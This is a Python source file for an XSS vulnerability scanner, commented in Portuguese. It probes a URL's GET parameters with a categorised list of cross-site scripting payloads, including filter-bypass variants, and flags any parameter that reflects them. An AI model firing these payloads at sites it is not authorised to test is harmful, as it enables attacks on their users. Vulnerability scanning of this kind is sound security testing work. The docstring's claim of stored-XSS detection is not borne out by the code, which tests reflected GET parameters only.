"""
Scanner XSS — Vlad Volkov
Detecta vulnerabilidades de Cross-Site Scripting (refletido, armazenado).
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Payloads XSS organizados por categoria
PAYLOADS_XSS = {
    "basico": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
    ],
    "bypass_filtro": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=\"alert`1`\">",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "';alert(1)//",
        "\"><img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "sem_aspas": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
    ],
    "dom": [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
    ],
}

# Marcador único para detectar reflexão
MARCADOR = "VLADXSS"


class ScannerXSS:
    """Detecta vulnerabilidades XSS em parâmetros GET/POST."""

    def __init__(self, timeout: int = 10, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao(self, url: str, dados: dict = None) -> Optional[object]:
        try:
            if dados:
                return self.sessao.post(url, data=dados, timeout=self.timeout,
                                        verify=self.verificar_ssl)
            return self.sessao.get(url, timeout=self.timeout, verify=self.verificar_ssl)
        except Exception:
            return None

    def _extrair_params_url(self, url: str) -> dict:
        parsed = urlparse(url)
        return parse_qs(parsed.query, keep_blank_values=True)

    def _url_com_param(self, url: str, param: str, valor: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [valor]
        novo_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=novo_query))

    def _checar_reflexao(self, resposta, payload: str) -> bool:
        if resposta is None:
            return False
        return payload.lower() in resposta.text.lower()

    def testar_params_get(self, url: str) -> List[dict]:
        """Testa parâmetros GET para XSS refletido."""
        params = self._extrair_params_url(url)
        if not params:
            return []

        encontrados = []

        for param in params:
            # Primeiro verificar se o parâmetro é refletido
            url_marcador = self._url_com_param(url, param, MARCADOR)
            resp_marcador = self._requisicao(url_marcador)

            if resp_marcador and MARCADOR in resp_marcador.text:
                # Parâmetro refletido, testar payloads
                for categoria, payloads in PAYLOADS_XSS.items():
                    for payload in payloads[:3]:  # Limitar payloads por categoria
                        url_teste = self._url_com_param(url, param, payload)
                        resp = self._requisicao(url_teste)

                        if self._checar_reflexao(resp, payload):
                            vuln = {
                                "tipo": "XSS Refletido",
                                "parametro": f"{param} (GET)",
                                "payload": payload,
                                "categoria": categoria,
                                "url": url_teste,
                                "severidade": "alto",
                            }
                            encontrados.append(vuln)
                            break  # Parar após primeiro payload confirmado

                    if any(v["parametro"] == f"{param} (GET)" for v in encontrados):
                        break

                time.sleep(0.2)

        return encontrados

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa scan XSS completo."""
        self.vulnerabilidades = []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando XSS em: {url[:60]}")

        vulns_get = self.testar_params_get(url)
        self.vulnerabilidades.extend(vulns_get)

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ XSS encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum XSS detectado nos parâmetros GET[/dim]")

        return self.vulnerabilidades

    def exibir_resultado(self) -> None:
        if not self.vulnerabilidades:
            return

        tabela = Table(title="Vulnerabilidades XSS", box=box.ROUNDED, border_style="red")
        tabela.add_column("Tipo", style="bold red", width=20)
        tabela.add_column("Parâmetro", style="cyan", width=20)
        tabela.add_column("Payload", style="yellow", width=35)
        tabela.add_column("Categoria", style="dim")

        for v in self.vulnerabilidades:
            tabela.add_row(
                v["tipo"], v["parametro"],
                v["payload"][:35], v["categoria"]
            )

        console.print(tabela)
